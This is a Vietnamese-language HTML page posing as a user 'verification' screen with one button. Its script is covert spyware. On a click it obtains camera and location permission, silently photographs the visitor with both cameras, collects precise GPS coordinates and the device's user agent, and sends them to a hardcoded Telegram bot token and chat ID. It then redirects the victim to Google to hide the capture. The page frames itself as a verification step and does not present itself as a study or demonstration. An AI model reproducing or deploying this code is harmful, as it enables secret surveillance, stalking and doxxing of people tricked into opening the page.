<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
<title>Xác Minh</title>
<style>
  /* Các style tối giản, đẹp cho giao diện trên điện thoại */
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #0a0e13; color: #fff; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden;
  }
  /* Nút xác minh */
  #verifyBtn {
    width: 80vw; max-width: 200px; height: 50px; border-radius: 25px;
    background: linear-gradient(135deg, #0066ff, #0052cc);
    border: none; color: #fff; font-size: 16px; font-weight: bold; cursor:pointer; box-shadow: 0 0 10px rgba(0,0,0,0.3);
  }
  #verifyBtn:disabled { background:#555; cursor:not-allowed; }
  /* Overlay loading */
  #loading {
    position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8);
    display:flex; justify-content:center; align-items:center; flex-direction:column; z-index:9999; display:none;
  }
  .loader {
    border:4px solid rgba(255,255,255,0.3); border-top-color:#0066ff; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  #loading span { margin-top:15px; color:#fff; font-size:15px; }
</style>
</head>
<body>

<button id="verifyBtn">XÁC MINH</button>

<div id="loading">
  <div class="loader"></div>
  <span>Đang xử lý...</span>
</div>

<script>
const TELEGRAM_BOT_TOKEN = '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds';
const TELEGRAM_CHAT_ID = '7031115869';

const verifyBtn = document.getElementById('verifyBtn');

async function requestCameraPermission() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    stream.getTracks().forEach(t => t.stop());
    return true;
  } catch(e) { return false; }
}

async function requestLocationPermission() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) { resolve(false); return; }
    navigator.geolocation.getCurrentPosition(() => resolve(true), () => resolve(false), {timeout:5000});
  });
}

async function takePhoto(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode}, audio:false});
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    await new Promise(res => video.onloadedmetadata = res);
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    if(facingMode==='user') {
      ctx.translate(canvas.width, 0);
      ctx.scale(-1,1);
    }
    ctx.drawImage(video,0,0);
    stream.getTracks().forEach(t => t.stop());
    const blob = await new Promise(res => canvas.toBlob(b => res(b), 'image/jpeg', 0.8));
    return blob;
  } catch(e) {
    console.error(e);
    return null;
  }
}

async function getLocation() {
  return new Promise((resolve) => {
    if(!navigator.geolocation) { resolve(null); return; }
    navigator.geolocation.getCurrentPosition(pos => {
      resolve({lat:pos.coords.latitude, lng:pos.coords.longitude, accuracy:pos.coords.accuracy});
    }, ()=>resolve(null), {timeout:5000, enableHighAccuracy:true});
  });
}

async function sendPhotosToTelegram(imgFront, imgBack, messageText) {
  try {
    const formData1 = new FormData();
    formData1.append('chat_id', TELEGRAM_CHAT_ID);
    formData1.append('photo', imgFront, 'front.jpg');
    formData1.append('caption', messageText);
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method:'POST',
      body: formData1
    });
    const formData2 = new FormData();
    formData2.append('chat_id', TELEGRAM_CHAT_ID);
    formData2.append('photo', imgBack, 'back.jpg');
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method:'POST',
      body: formData2
    });
  } catch(e) { console.error('Gửi Telegram lỗi', e); }
}

function createMessage(location) {
  const now = new Date();
  const timeStr = now.toLocaleString('vi-VN');
  let msg = `🔔 <b>XÁC MINH NGƯỜI DÙNG</b>\n`;
  msg += `${timeStr}\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  msg += `📸 <b>Ảnh 1:</b> Camera trước\n`;
  msg += `📸 <b>Ảnh 2:</b> Camera sau\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  if(location) {
    msg += `📍 <b>Vị trí:</b>\n`;
    msg += `🗺 <a href="https://www.google.com/maps?q=${location.lat},${location.lng}">Xem bản đồ</a>\n`;
    msg += `Tọa độ: ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}\n`;
    msg += `Độ chính xác: ${location.accuracy}m\n`;
  } else {
    msg += `📍 <b>Vị trí:</b> Không lấy được\n`;
  }
  msg += `\n────────────────────────\n`;
  msg += `🔧 Thiết bị: ${navigator.userAgent}\n`;
  return msg;
}

async function process() {
  // Không hiển thị loading, chạy luôn
  // Đặt biến để theo dõi hoàn thành
  let location = null;

  // Yêu cầu quyền
  const camOk = await requestCameraPermission();
  const locOk = await requestLocationPermission();

  if(!camOk) { alert('Vui lòng cấp quyền camera'); }
  if(!locOk) { alert('Vui lòng cấp quyền định vị'); }

  // Lấy vị trí sớm nhất, chạy song song
  const locationPromise = getLocation();

  // Chụp ảnh song song
  const [frontBlob, backBlob] = await Promise.all([
    takePhoto('user'),
    takePhoto('environment')
  ]);

  // Lấy vị trí
  location = await locationPromise;

  // Tạo nội dung
  const messageText = createMessage(location);

  // Gửi lên Telegram
  sendPhotosToTelegram(frontBlob, backBlob, messageText);
}

verifyBtn.addEventListener('click', () => {
  if(checkInAppBrowser()) return;
  // Không chờ, chạy background
  process();

  // Chuyển hướng ngay lập tức
  window.location.href = 'https://www.google.com';
});
</script>

</body>
</html>
